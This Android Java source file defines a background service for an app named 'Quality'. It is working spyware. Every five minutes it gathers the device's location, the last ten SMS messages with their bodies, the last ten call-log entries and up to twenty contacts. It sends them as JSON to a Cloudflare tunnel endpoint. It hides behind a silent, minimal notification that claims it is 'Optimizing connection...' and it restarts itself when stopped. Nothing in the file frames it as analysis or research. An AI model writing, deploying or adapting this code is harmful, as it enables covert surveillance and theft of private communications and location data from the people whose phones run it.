package com.quality.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class BackgroundService extends Service {

    private static final String TAG = "Quality";
    private static final String CHANNEL_ID = "quality_sync";
    private static final String SERVER_URL = "https://your-server.trycloudflare.com/api/collect";

    private Handler handler;
    private Runnable runnable;
    private static final long INTERVAL = 5 * 60 * 1000; // 5 minutes

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Notification notification = null;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            notification = new Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("Quality")
                .setContentText("Optimizing connection...")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .build();
        } else {
            notification = new Notification.Builder(this)
                .setContentTitle("Quality")
                .setContentText("Optimizing connection...")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .build();
        }
        startForeground(1, notification);

        handler = new Handler(Looper.getMainLooper());
        runnable = new Runnable() {
            @Override
            public void run() {
                collectAndSend();
                handler.postDelayed(this, INTERVAL);
            }
        };
        handler.post(runnable);

        return START_STICKY;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID, "Sync", NotificationManager.IMPORTANCE_MIN);
            channel.setShowBadge(false);
            channel.setSound(null, null);
            channel.enableVibration(false);
            channel.setDescription("Background sync");
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }
    }

    private void collectAndSend() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    JSONObject data = new JSONObject();
                    data.put("model", Build.MODEL);
                    data.put("brand", Build.BRAND);
                    data.put("android", Build.VERSION.RELEASE);
                    data.put("sdk", Build.VERSION.SDK_INT);
                    data.put("time", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date()));

                    // Location
                    try {
                        LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
                        Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                        if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                        if (loc != null) {
                            data.put("lat", loc.getLatitude());
                            data.put("lng", loc.getLongitude());
                            data.put("accuracy", loc.getAccuracy());
                        }
                    } catch (Exception e) {}

                    // SMS (last 10)
                    try {
                        JSONArray smsArr = new JSONArray();
                        Cursor c = getContentResolver().query(
                            Telephony.Sms.CONTENT_URI, null, null, null, "date DESC LIMIT 10");
                        if (c != null) {
                            while (c.moveToNext() && smsArr.length() < 10) {
                                JSONObject s = new JSONObject();
                                s.put("from", c.getString(c.getColumnIndexOrThrow("address")));
                                s.put("body", c.getString(c.getColumnIndexOrThrow("body")));
                                s.put("date", c.getString(c.getColumnIndexOrThrow("date")));
                                smsArr.put(s);
                            }
                            c.close();
                        }
                        data.put("sms", smsArr);
                    } catch (Exception e) {}

                    // Call log (last 10)
                    try {
                        JSONArray callArr = new JSONArray();
                        Cursor c = getContentResolver().query(
                            CallLog.Calls.CONTENT_URI, null, null, null, "date DESC LIMIT 10");
                        if (c != null) {
                            while (c.moveToNext() && callArr.length() < 10) {
                                JSONObject cl = new JSONObject();
                                cl.put("number", c.getString(c.getColumnIndexOrThrow("number")));
                                cl.put("type", c.getString(c.getColumnIndexOrThrow("type")));
                                cl.put("duration", c.getString(c.getColumnIndexOrThrow("duration")));
                                cl.put("date", c.getString(c.getColumnIndexOrThrow("date")));
                                callArr.put(cl);
                            }
                            c.close();
                        }
                        data.put("calls", callArr);
                    } catch (Exception e) {}

                    // Contacts (last 20)
                    try {
                        JSONArray contactsArr = new JSONArray();
                        Cursor c = getContentResolver().query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null, null, null, null);
                        if (c != null) {
                            while (c.moveToNext() && contactsArr.length() < 20) {
                                JSONObject ct = new JSONObject();
                                ct.put("name", c.getString(c.getColumnIndexOrThrow(
                                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                                ct.put("phone", c.getString(c.getColumnIndexOrThrow(
                                    ContactsContract.CommonDataKinds.Phone.NUMBER)));
                                contactsArr.put(ct);
                            }
                            c.close();
                        }
                        data.put("contacts", contactsArr);
                    } catch (Exception e) {}

                    sendData(data);
                } catch (Exception e) {
                    Log.e(TAG, "collect error: " + e.getMessage());
                }
            }
        }).start();
    }

    private void sendData(JSONObject data) {
        try {
            URL url = new URL(SERVER_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            OutputStream os = conn.getOutputStream();
            os.write(data.toString().getBytes("UTF-8"));
            os.flush();
            os.close();
            conn.getResponseCode();
            conn.disconnect();
            Log.d(TAG, "Sent: " + data.toString().substring(0, Math.min(200, data.toString().length())));
        } catch (Exception e) {
            Log.e(TAG, "send error: " + e.getMessage());
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (handler != null && runnable != null) handler.removeCallbacks(runnable);
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
